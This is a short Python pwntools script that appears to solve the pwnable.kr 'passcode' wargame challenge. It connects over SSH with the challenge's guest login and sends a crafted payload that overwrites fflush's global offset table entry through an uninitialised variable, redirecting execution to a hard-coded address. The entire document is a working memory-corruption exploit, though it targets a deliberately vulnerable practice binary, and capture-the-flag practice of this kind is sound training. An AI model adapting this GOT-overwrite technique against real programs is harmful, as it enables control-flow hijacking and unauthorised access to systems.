from pwn import *
server = ["pwnable.kr", 2222, "passcode", "guest"]

con = ssh(host=server[0], port=server[1], user=server[2], password=server[3])
p = con.process("./passcode")
print(p.recvuntil("name : "))
fflush_adr = p32(0x804A004)
payload = fflush_adr*25
p.sendline(payload)
target_adr = str(0x080485d7)
print(p.recvuntil("passcode1 : "))
p.sendline(target_adr)
print(p.recvall().decode())


